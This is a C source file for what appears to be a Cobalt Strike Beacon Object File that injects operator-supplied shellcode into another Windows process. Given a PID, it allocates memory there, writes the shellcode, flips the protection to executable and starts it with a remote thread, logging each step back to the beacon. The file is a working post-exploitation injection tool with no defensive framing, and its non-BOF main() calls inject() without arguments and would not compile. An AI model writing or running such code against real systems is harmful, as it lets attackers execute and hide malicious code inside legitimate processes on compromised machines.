#include <windows.h>
#include "bofdefs.h"
#include "base.c"
#include <tchar.h>
#include <stdio.h>


void inject(const int pid, const CHAR* shellcode, SIZE_T shellcodeSize) {
    BeaconPrintf(CALLBACK_OUTPUT, "shellcode[0..3]: %02x %02x %02x %02x\n",
        shellcode[0], shellcode[1], shellcode[2], shellcode[3]);

    BeaconPrintf(CALLBACK_OUTPUT, "pid: %d\n", pid);

    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    BeaconPrintf(CALLBACK_OUTPUT, "hProcess (pointer) = %p\n", (void*)hProcess);

    if (hProcess == NULL) {
        DWORD err = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_OUTPUT, "failed to open the process: %lu\n", err);
        return;
    }

    LPVOID allocatedMemory = KERNEL32$VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    BeaconPrintf(CALLBACK_OUTPUT, "allocateMemory (pointer) = %p\n", (void*)allocatedMemory);

    if (allocatedMemory == 0) {
        DWORD err = KERNEL32$GetLastError();
        KERNEL32$CloseHandle(hProcess);
        BeaconPrintf(CALLBACK_OUTPUT, "failed to allocate memory in remote process: %lu\n", err);
        return;
    }

    SIZE_T bytesWritten = 0;
    BOOL writeProcessMemoryRes = KERNEL32$WriteProcessMemory(hProcess, allocatedMemory, shellcode, shellcodeSize, &bytesWritten);
    BeaconPrintf(CALLBACK_OUTPUT, "bytes written: %llu\n",(unsigned long long)bytesWritten);

    if (writeProcessMemoryRes == 0 || (SIZE_T)bytesWritten != (SIZE_T)shellcodeSize) {
        DWORD err = KERNEL32$GetLastError();
        KERNEL32$CloseHandle(hProcess);
        BeaconPrintf(CALLBACK_OUTPUT, "failed to write shellcode to remote process: %lu\n", err);
        return;
	}

    DWORD oldProtect = 0;
    BOOL virtualProtectExRes = KERNEL32$VirtualProtectEx(hProcess, allocatedMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
	if (virtualProtectExRes == 0) {
        DWORD err = KERNEL32$GetLastError();
        KERNEL32$CloseHandle(hProcess);
        BeaconPrintf(CALLBACK_OUTPUT, "failed to change memory protection: %lu\n", err);
        return;
	}

    BeaconPrintf(CALLBACK_OUTPUT, "change memory protection to RX\n");

	HANDLE hThread = KERNEL32$CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        DWORD err = KERNEL32$GetLastError();
        KERNEL32$CloseHandle(hProcess);
        BeaconPrintf(CALLBACK_OUTPUT, "failed to create remote thread: %lu\n", err);
        return;
	}

	KERNEL32$WaitForSingleObject(hThread, INFINITE);


	BeaconPrintf(CALLBACK_OUTPUT, "shellcode executed successfully\n");
	KERNEL32$CloseHandle(hThread);
    



    return;
}

#ifdef BOF
VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{


    datap parser;
    BeaconDataParse(&parser, Buffer, Length);


    DWORD pid = BeaconDataInt(&parser);
    int shellcodeSizeInt = 0;
    CHAR* shellcode = BeaconDataExtract(&parser, &shellcodeSizeInt);
    SIZE_T shellcodeSize = (SIZE_T)shellcodeSizeInt;


    if (!bofstart())
    {
        return;
    }

    inject(pid, shellcode, shellcodeSize);

    printoutput(TRUE);
    bofstop();
};
#else
int main()
{
    inject();
    return 1;
}
#endif
